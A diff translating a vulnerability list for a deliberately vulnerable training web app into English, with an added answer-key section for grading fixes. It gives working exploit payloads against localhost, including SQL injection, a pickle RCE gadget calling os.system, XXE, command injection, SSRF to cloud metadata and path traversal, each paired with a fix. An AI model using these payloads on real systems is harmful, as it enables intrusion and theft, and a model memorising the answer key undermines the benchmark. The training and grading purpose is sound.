@@ -1,45 +1,63 @@
-# WorldPress — 漏洞清单（学习用途）
+# WorldPress — Vulnerability List (For Learning Only)
 
-> 本项目用于 Web 安全学习，代码中故意植入了以下漏洞。
-> **严禁用于任何生产环境或对未授权目标的测试。**
+> This project is for web security learning. The following vulnerabilities are intentionally embedded in the code.
+> **Do NOT use in any production environment or test against targets without explicit authorization.**
 
 ---
 
-## 漏洞总览（共 21 个，跨 6 条路径）
+## Overview (21 in total, across 6 paths)
 
-| # | 漏洞类型 | 路径 / 端点 | 代码位置 |
+| # | Vulnerability Type | Path / Endpoint | Code Location |
 |---|----------|------------|---------|
-| 1 | SQL 注入（登录） | `POST /api/auth/login` | `routes/auth.py` |
-| 2 | 开放重定向 | `POST /api/auth/login?redirect=` | `routes/auth.py` |
-| 3 | 无速率限制（暴力破解） | `POST /api/auth/login` | `routes/auth.py` |
-| 4 | 弱 JWT 密钥 | 所有需鉴权端点 | `config.py`, `routes/auth.py` |
-| 5 | IDOR（越权读取用户） | `GET /api/users/{id}` | `routes/users.py` |
-| 6 | 批量赋值（提权） | `PUT /api/users/{id}` | `routes/users.py` |
-| 7 | 敏感数据暴露（密码哈希） | `GET /api/users` / `GET /api/users/{id}` | `routes/users.py` |
-| 8 | SQL 注入（搜索） | `GET /api/posts?search=` | `routes/posts.py` |
-| 9 | 存储型 XSS（文章内容） | `POST /api/posts` / `PUT /api/posts/{id}` | `routes/posts.py` |
-| 10 | IDOR（越权编辑/删除文章） | `PUT /DELETE /api/posts/{id}` | `routes/posts.py` |
-| 11 | 路径穿越（下载） | `GET /api/media/download?file=` | `routes/media.py` |
-| 11b | 路径穿越（预览，无鉴权） | `GET /api/media/preview?path=` | `routes/media.py` |
-| 12 | 不限制文件上传类型 | `POST /api/media/upload` | `routes/media.py` |
-| 13 | 命令注入 | `POST /api/media/thumbnail` | `routes/media.py` |
+| 1 | SQL Injection (Login) | `POST /api/auth/login` | `routes/auth.py` |
+| 2 | Open Redirect | `POST /api/auth/login?redirect=` | `routes/auth.py` |
+| 3 | No Rate Limiting (Brute Force) | `POST /api/auth/login` | `routes/auth.py` |
+| 4 | Weak JWT Secret | All authenticated endpoints | `config.py`, `routes/auth.py` |
+| 5 | IDOR (Unauthorized User Read) | `GET /api/users/{id}` | `routes/users.py` |
+| 6 | Mass Assignment (Privilege Escalation) | `PUT /api/users/{id}` | `routes/users.py` |
+| 7 | Sensitive Data Exposure (Password Hash) | `GET /api/users` / `GET /api/users/{id}` | `routes/users.py` |
+| 8 | SQL Injection (Search) | `GET /api/posts?search=` | `routes/posts.py` |
+| 9 | Stored XSS (Post Content) | `POST /api/posts` / `PUT /api/posts/{id}` | `routes/posts.py` |
+| 10 | IDOR (Unauthorized Post Edit/Delete) | `PUT /DELETE /api/posts/{id}` | `routes/posts.py` |
+| 11 | Path Traversal (Download) | `GET /api/media/download?file=` | `routes/media.py` |
+| 11b | Path Traversal (Preview, Unauthenticated) | `GET /api/media/preview?path=` | `routes/media.py` |
+| 12 | Unrestricted File Upload Type | `POST /api/media/upload` | `routes/media.py` |
+| 13 | Command Injection | `POST /api/media/thumbnail` | `routes/media.py` |
 | 14 | SSRF | `POST /api/settings/fetch-url` | `routes/settings.py` |
-| 15 | 硬编码凭据泄露 | `GET /api/settings` | `config.py`, `routes/settings.py` |
-| 16 | 不安全反序列化（Pickle） | `POST /api/settings/import` | `routes/settings.py` |
-| 17 | XXE（XML 外部实体） | `POST /api/settings/import-xml` | `routes/settings.py` |
-| 18 | 信息泄露（完整堆栈跟踪） | 所有异常 | `app.py` |
-| 19 | 访问控制绕过（Header 注入） | `GET /api/users`, `/api/settings` 等管理接口 | `routes/users.py`, `routes/settings.py` |
-| 20 | 存储型 XSS（评论） | `POST /api/posts/{id}/comments` | `routes/posts.py` |
-| 21 | 反射型 XSS（评论作者） | `POST /api/posts/{id}/comments`（错误响应） | `routes/posts.py` |
+| 15 | Hardcoded Credential Leakage | `GET /api/settings` | `config.py`, `routes/settings.py` |
+| 16 | Insecure Deserialization (Pickle) | `POST /api/settings/import` | `routes/settings.py` |
+| 17 | XXE (XML External Entity) | `POST /api/settings/import-xml` | `routes/settings.py` |
+| 18 | Information Disclosure (Full Stack Trace) | All exceptions | `app.py` |
+| 19 | Authorization Bypass (Header Injection) | Admin endpoints like `/api/users`, `/api/settings` | `routes/users.py`, `routes/settings.py` |
+| 20 | Stored XSS (Comments) | `POST /api/posts/{id}/comments` | `routes/posts.py` |
+| 21 | Reflected XSS (Comment Author) | `POST /api/posts/{id}/comments` (error response) | `routes/posts.py` |
 
 ---
 
-## 各漏洞详细说明与利用示例
+## Ideal Deliveries
 
-### 1. SQL 注入 — 登录绕过
-**端点：** `POST /api/auth/login`
+The ideal deliveries define the delivery-level ground truth. Each ideal delivery specifies a reviewer-oriented repair boundary: it groups one or more related answer-key vulnerabilities that should ideally be fixed and reviewed together because they share a code path, trust boundary, authentication flow, rendering pattern, or cross-cutting control.
 
-登录查询使用字符串格式化拼接，可通过经典 `' OR '1'='1` 绕过身份验证。
+| Ideal delivery | Answer-key items | Rationale |
+|---|---|---|
+| Login and authentication abuse controls | #1, #2, #3, #4 | These issues share the authentication entrypoint and its immediate trust boundary: login query construction, post-login redirect handling, brute-force resistance, and the JWT secret used to establish authenticated sessions. |
+| Admin authorization gate (remove header bypass) | #19 | Admin-only routes rely on a common `require_admin()` control. The header-based override is a single high-impact bypass and should be removed and reviewed as one authorization-boundary fix. |
+| User data access and profile update controls | #5, #6, #7 | These issues share `routes/users.py` and the user object trust boundary: object-level authorization (IDOR), update-field allowlisting (mass assignment), and response serialization (do not expose password hashes). |
+| Post query + ownership + rendering safety | #8, #9, #10, #20, #21 | These issues share `routes/posts.py` and the post/comment content boundary: safe query construction for search, ownership checks for edit/delete, and consistent HTML escaping/sanitization for stored/reflected content surfaces. |
+| Media file handling and OS interaction boundary | #11, #11b, #12, #13 | Download/preview path traversal, upload type restrictions, and thumbnail generation all connect user input to filesystem paths or OS-level execution; they should be reviewed together with one normalization, confinement, and safe process-exec strategy. |
+| Settings fetch/import parser safety | #14, #15, #16, #17 | Outbound URL fetch (SSRF), configuration/credential exposure, and import parsing (pickle / XML) form a single settings-admin trust boundary and should be hardened together with allowlists and safe parsers. |
+| Error handling and response minimization | #18 | Returning full stack traces is a distinct cross-cutting output control. Review it independently to ensure consistent error responses and server-side logging. |
+
+These groupings are used to evaluate delivery alignment and reviewability. They do not replace the vulnerability list itself.
+
+---
+
+## Details and Exploitation Examples
+
+### 1. SQL Injection — Login Bypass
+**Endpoint:** `POST /api/auth/login`
+
+The login query is built via string formatting/concatenation, so classic `' OR '1'='1` can bypass authentication.
 
 ```bash
 curl -s -X POST http://localhost:5000/api/auth/login \
@@ -47,29 +65,29 @@ curl -s -X POST http://localhost:5000/api/auth/login \
   -d '{"username": "admin'\'' OR '\''1'\''='\''1", "password": "x"}'
 ```
 
-**修复方案：** 使用参数化查询 `cursor.execute("SELECT ... WHERE username=?", (username,))`
+**Fix:** Use parameterized queries, e.g. `cursor.execute("SELECT ... WHERE username=?", (username,))`.
 
 ---
 
-### 2. 开放重定向
-**端点：** `POST /api/auth/login?redirect=https://evil.com`
+### 2. Open Redirect
+**Endpoint:** `POST /api/auth/login?redirect=https://evil.com`
 
-登录成功后，`redirect` 参数未经白名单校验就被直接使用，可将用户跳转到任意外部站点（钓鱼攻击）。
+After successful login, the `redirect` parameter is used directly without allowlist validation, enabling redirects to arbitrary external sites (phishing).
 
 ```
 POST /api/auth/login?redirect=https://attacker.com
 ```
 
-前端会执行 `window.location.href = data.redirect`，完成重定向。
+The frontend executes `window.location.href = data.redirect`, completing the redirect.
 
-**修复方案：** 验证 redirect URL 必须以 `/` 开头或在白名单域名内。
+**Fix:** Require the redirect URL to start with `/` (relative path) or be within an allowlisted domain.
 
 ---
 
-### 3. 无速率限制 — 暴力破解
-**端点：** `POST /api/auth/login`
+### 3. No Rate Limiting — Brute Force
+**Endpoint:** `POST /api/auth/login`
 
-登录接口没有任何速率限制或账号锁定机制，攻击者可无限次尝试密码。
+The login endpoint has no rate limiting or account lockout, allowing unlimited password attempts.
 
 ```bash
 for pw in password 123456 admin123 letmein; do
@@ -79,44 +97,44 @@ for pw in password 123456 admin123 letmein; do
 done
 ```
 
-**修复方案：** 使用 Flask-Limiter 限流；连续失败后锁定账号。
+**Fix:** Add rate limiting (e.g. Flask-Limiter) and lock accounts after repeated failures.
 
 ---
 
-### 4. 弱 JWT 密钥
-**文件：** `config.py`，密钥为 `wp_secret_2024`
+### 4. Weak JWT Secret
+**File:** `config.py` (secret: `wp_secret_2024`)
 
-密钥短且可预测，可被离线字典攻击暴力破解，进而伪造任意用户的 Token。
+The secret is short and predictable, making it vulnerable to offline dictionary/brute-force attacks, enabling token forgery.
 
 ```python
 import jwt, itertools
-token = "<从登录响应中获取>"
-# 使用 hashcat 或 jwt_tool 进行字典攻击
+token = "<get from login response>"
+# Use hashcat or jwt_tool for dictionary attacks
 # hashcat -a 0 -m 16500 <token> wordlist.txt
 ```
 
-**修复方案：** 使用 `secrets.token_hex(32)` 生成并从环境变量读取密钥。
+**Fix:** Generate a strong secret (e.g. `secrets.token_hex(32)`) and load it from environment variables.
 
 ---
 
-### 5. IDOR — 越权读取用户信息
-**端点：** `GET /api/users/2`
+### 5. IDOR — Unauthorized User Read
+**Endpoint:** `GET /api/users/2`
 
-任何已登录用户（包括普通 editor）均可读取任意用户的详细信息，包括密码哈希。
+Any authenticated user (including a normal editor) can read any user's details, including password hashes.
 
 ```bash
 curl http://localhost:5000/api/users/1 \
   -H "Authorization: Bearer <editor_token>"
 ```
 
-**修复方案：** 检查 `current_user["user_id"] == user_id` 或 `role == "admin"`。
+**Fix:** Enforce `current_user["user_id"] == user_id` or require `role == "admin"`.
 
 ---
 
-### 6. 批量赋值 — 水平提权
-**端点：** `PUT /api/users/{id}`
+### 6. Mass Assignment — Privilege Escalation
+**Endpoint:** `PUT /api/users/{id}`
 
-接口直接将客户端 JSON 中所有字段映射到 UPDATE 语句，攻击者可将自己的 `role` 改为 `admin`。
+The handler maps all JSON fields directly into an UPDATE statement, so an attacker can set their `role` to `admin`.
 
 ```bash
 curl -X PUT http://localhost:5000/api/users/2 \
@@ -125,41 +143,41 @@ curl -X PUT http://localhost:5000/api/users/2 \
   -d '{"role": "admin"}'
 ```
 
-**修复方案：** 维护允许修改的字段白名单（如 `bio`, `email`），role 变更需要管理员权限。
+**Fix:** Use an allowlist of editable fields (e.g. `bio`, `email`); require admin privileges for role changes.
 
 ---
 
-### 7. 敏感数据暴露 — 密码哈希泄露
-**端点：** `GET /api/users`，`GET /api/users/{id}`
+### 7. Sensitive Data Exposure — Password Hash Leakage
+**Endpoints:** `GET /api/users`, `GET /api/users/{id}`
 
-API 响应中直接包含 `password` 字段（MD5 哈希）。MD5 哈希可被彩虹表秒破。
+API responses include the `password` field (MD5 hash). MD5 hashes are often trivially crackable via rainbow tables.
 
 ```bash
-# 对 admin123 的 MD5: 0192023a7bbd73250516f069df18b500
+# MD5(admin123) = 0192023a7bbd73250516f069df18b500
 echo -n "admin123" | md5sum
 ```
 
-**修复方案：** 响应中排除 `password` 字段；使用 bcrypt 存储密码。
+**Fix:** Exclude `password` from responses; store passwords with bcrypt.
 
 ---
 
-### 8. SQL 注入 — 搜索
-**端点：** `GET /api/posts?search=`
+### 8. SQL Injection — Search
+**Endpoint:** `GET /api/posts?search=`
 
-搜索参数被直接拼入 LIKE 查询，可使用 UNION 注入读取任意表数据。
+The search parameter is concatenated into a LIKE query, enabling UNION-based injection to read arbitrary table data.
 
 ```bash
 curl "http://localhost:5000/api/posts?search=%25' UNION SELECT id,username,password,email,role,NULL,NULL,NULL,NULL,NULL,NULL FROM users--"
 ```
 
-**修复方案：** 使用参数化查询 `LIKE ?` 并传入 `f"%{search}%"`。
+**Fix:** Use parameterized queries (`LIKE ?`) and pass `f\"%{search}%\"`.
 
 ---
 
-### 9. 存储型 XSS — 文章内容
-**端点：** `POST /api/posts`，前端 `PostEdit.vue`
+### 9. Stored XSS — Post Content
+**Endpoints:** `POST /api/posts` (frontend: `PostEdit.vue`)
 
-文章内容以原始 HTML 存入数据库，前端使用 `v-html` 直接渲染，任何查看文章的用户都会执行注入的脚本。
+Post content is stored as raw HTML, and the frontend renders it with `v-html`, so any viewer executes injected scripts.
 
 ```json
 {
@@ -168,36 +186,36 @@ curl "http://localhost:5000/api/posts?search=%25' UNION SELECT id,username,passw
 }
 ```
 
-**修复方案：** 服务端使用 bleach 净化 HTML；前端改用文本渲染而非 `v-html`。
+**Fix:** Sanitize HTML server-side (e.g. bleach); render as text on the frontend instead of `v-html`.
 
 ---
 
-### 10. IDOR — 越权修改/删除文章
-**端点：** `PUT /api/posts/{id}`，`DELETE /api/posts/{id}`
+### 10. IDOR — Unauthorized Post Edit/Delete
+**Endpoints:** `PUT /api/posts/{id}`, `DELETE /api/posts/{id}`
 
-任何登录用户均可修改或删除其他人的文章，后端不校验文章所属权。
+Any authenticated user can modify/delete other users' posts because ownership is not enforced server-side.
 
 ```bash
-# editor 用户删除 admin 的文章
+# An editor deletes an admin's post
 curl -X DELETE http://localhost:5000/api/posts/1 \
   -H "Authorization: Bearer <editor_token>"
 ```
 
-**修复方案：** 验证 `post.author_id == current_user.user_id` 或 `role == "admin"`。
+**Fix:** Validate `post.author_id == current_user.user_id` or require `role == "admin"`.
 
 ---
 
-### 11. 路径穿越 — 文件下载
-**端点：** `GET /api/media/download?file=../../config.py`
+### 11. Path Traversal — File Download
+**Endpoint:** `GET /api/media/download?file=../../config.py`
 
-`file` 参数与 uploads 目录拼接时未做路径规范化，可读取服务器上的任意文件。
+The `file` parameter is joined with the uploads directory without canonicalization checks, enabling reads of arbitrary server files.
 
 ```bash
 curl "http://localhost:5000/api/media/download?file=../../config.py" \
   -H "Authorization: Bearer <token>" -o stolen_config.py
 ```
 
-**修复方案：**
+**Fix:**
 ```python
 real = os.path.realpath(file_path)
 if not real.startswith(os.path.realpath(UPLOAD_FOLDER)):
@@ -206,39 +224,39 @@ if not real.startswith(os.path.realpath(UPLOAD_FOLDER)):
 
 ---
 
-### 11b. 路径穿越 — 无需鉴权预览
-**端点：** `GET /api/media/preview?path=../../backend/config.py`
+### 11b. Path Traversal — Unauthenticated Preview
+**Endpoint:** `GET /api/media/preview?path=../../backend/config.py`
 
-`/preview` 端点不需要登录，且同样存在路径穿越漏洞，攻击面更大。
-
----
-
-### 12. 不限制文件上传类型
-**端点：** `POST /api/media/upload`
-
-仅调用 `secure_filename` 防止路径穿越，但未验证文件扩展名或 MIME 类型，可上传 `.py`、`.sh` 等可执行文件。
-
-**修复方案：** 校验扩展名白名单 `ALLOWED_EXTENSIONS = {'png','jpg','gif','pdf'}`。
+The `/preview` endpoint requires no authentication and has the same traversal issue, so the attack surface is larger.
 
 ---
 
-### 13. 命令注入
-**端点：** `POST /api/media/thumbnail`
+### 12. Unrestricted File Upload Type
+**Endpoint:** `POST /api/media/upload`
 
-`filename` 和 `size` 参数直接拼入 shell 命令，可执行任意系统命令。
+Only `secure_filename` is used to mitigate traversal; file extensions/MIME types are not validated, so executable files like `.py`/`.sh` can be uploaded.
+
+**Fix:** Validate an allowlist of extensions, e.g. `ALLOWED_EXTENSIONS = {'png','jpg','gif','pdf'}`.
+
+---
+
+### 13. Command Injection
+**Endpoint:** `POST /api/media/thumbnail`
+
+The `filename` and `size` parameters are concatenated into a shell command, enabling arbitrary command execution.
 
 ```json
 {"filename": "a.jpg; id > /tmp/pwned.txt #", "size": "150x150"}
 ```
 
-**修复方案：** 使用 `subprocess.run([...], shell=False)` 传递参数列表，而非 shell=True 字符串。
+**Fix:** Use `subprocess.run([...], shell=False)` with an argument list instead of `shell=True` strings.
 
 ---
 
 ### 14. SSRF
-**端点：** `POST /api/settings/fetch-url`
+**Endpoint:** `POST /api/settings/fetch-url`
 
-服务端代理访问任意 URL，可探测内网服务、云实例元数据等。
+The server proxies arbitrary URLs, enabling internal network probing and cloud instance metadata access.
 
 ```json
 {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
@@ -248,23 +266,23 @@ if not real.startswith(os.path.realpath(UPLOAD_FOLDER)):
 {"url": "http://127.0.0.1:5000/api/users"}
 ```
 
-**修复方案：** 解析并校验目标 IP 不属于私有地址段；使用 URL 白名单。
+**Fix:** Resolve and validate the destination IP is not in private ranges; use a URL allowlist.
 
 ---
 
-### 15. 硬编码凭据泄露
-**文件：** `config.py`，**端点：** `GET /api/settings`
+### 15. Hardcoded Credential Leakage
+**File:** `config.py`, **Endpoint:** `GET /api/settings`
 
-默认凭据 `admin/admin123` 写死在代码中，且管理员调用 `/api/settings` 时会在响应体中明文返回。
+Default credentials `admin/admin123` are hardcoded, and when an admin calls `/api/settings` they are returned in cleartext in the response body.
 
-**修复方案：** 通过环境变量传入凭据；响应中不返回凭据字段。
+**Fix:** Provide credentials via environment variables; never return credential fields in responses.
 
 ---
 
-### 16. 不安全反序列化（Pickle RCE）
-**端点：** `POST /api/settings/import`
+### 16. Insecure Deserialization (Pickle RCE)
+**Endpoint:** `POST /api/settings/import`
 
-接口 base64 解码后直接 `pickle.loads()`，可实现远程代码执行。
+The endpoint base64-decodes input and calls `pickle.loads()` directly, enabling remote code execution.
 
 ```python
 import pickle, os, base64
@@ -274,17 +292,17 @@ class Exploit(object):
         return (os.system, ('id > /tmp/rce.txt',))
 
 payload = base64.b64encode(pickle.dumps(Exploit())).decode()
-# 将 payload 发送到 /api/settings/import
+# Send the payload to /api/settings/import
 ```
 
-**修复方案：** 禁止 pickle；改用 JSON 格式并做 schema 校验。
+**Fix:** Disallow pickle; use JSON and validate against a schema.
 
 ---
 
-### 17. XXE（XML 外部实体注入）
-**端点：** `POST /api/settings/import-xml`
+### 17. XXE (XML External Entity)
+**Endpoint:** `POST /api/settings/import-xml`
 
-lxml 默认开启实体解析，可通过构造恶意 XML 读取本地文件。
+lxml can resolve external entities by default; malicious XML can be crafted to read local files.
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -297,23 +315,23 @@ lxml 默认开启实体解析，可通过构造恶意 XML 读取本地文件。
 </settings>
 ```
 
-**修复方案：** `etree.fromstring(xml, parser=etree.XMLParser(resolve_entities=False))`
+**Fix:** `etree.fromstring(xml, parser=etree.XMLParser(resolve_entities=False))`
 
 ---
 
-### 18. 信息泄露 — 完整堆栈跟踪
-**文件：** `app.py`
+### 18. Information Disclosure — Full Stack Trace
+**File:** `app.py`
 
-全局错误处理器将 Python 完整堆栈跟踪（含文件路径、行号、变量名）返回给客户端。
+A global error handler returns full Python stack traces (including file paths, line numbers, variable names) to clients.
 
-**修复方案：** 生产环境只返回通用错误消息；将详细信息记录到服务端日志。
+**Fix:** Return only generic error messages in production; log details server-side.
 
 ---
 
-### 19. 访问控制绕过 — Header 注入
-**端点：** 所有管理接口（`/api/users`, `/api/settings` 等）
+### 19. Authorization Bypass — Header Injection
+**Endpoints:** All admin endpoints (e.g. `/api/users`, `/api/settings`)
 
-当请求包含 `X-Admin-Override: true` 头时，`require_admin()` 函数直接返回 True，绕过角色检查。
+If the request includes the `X-Admin-Override: true` header, `require_admin()` returns True and bypasses role checks.
 
 ```bash
 curl http://localhost:5000/api/users \
@@ -321,21 +339,21 @@ curl http://localhost:5000/api/users \
   -H "X-Admin-Override: true"
 ```
 
-**修复方案：** 删除该 Header 绕过逻辑；仅根据 JWT 中的角色字段授权。
+**Fix:** Remove the header-based bypass; authorize only based on the JWT role claim.
 
 ---
 
-### 20. 存储型 XSS — 评论内容
-**端点：** `POST /api/posts/{id}/comments`
+### 20. Stored XSS — Comment Content
+**Endpoint:** `POST /api/posts/{id}/comments`
 
-评论内容同样以原始 HTML 存储并通过 `v-html` 渲染，影响所有查看文章的访客。
+Comment content is also stored as raw HTML and rendered via `v-html`, impacting all visitors who view the post.
 
 ---
 
-### 21. 反射型 XSS — 评论作者
-**端点：** `POST /api/posts/{id}/comments`（错误响应）
+### 21. Reflected XSS — Comment Author
+**Endpoint:** `POST /api/posts/{id}/comments` (error response)
 
-当 `content` 为空时，`author` 字段直接插入 HTML 响应体并以 `text/html` 类型返回，若浏览器直接渲染则触发 XSS。
+When `content` is empty, the `author` field is inserted directly into an HTML response with `text/html`. If a browser renders it, XSS triggers.
 
 ```bash
 curl -X POST "http://localhost:5000/api/posts/1/comments" \
@@ -345,11 +363,11 @@ curl -X POST "http://localhost:5000/api/posts/1/comments" \
 
 ---
 
-## 技术栈与快速启动
+## Tech Stack and Quick Start
 
 ```bash
 ./start.sh
-# 前端: http://localhost:3000
-# 后端: http://localhost:5000
-# 账号: admin / admin123
+# Frontend: http://localhost:3000
+# Backend: http://localhost:5000
+# Account: admin / admin123
 ```
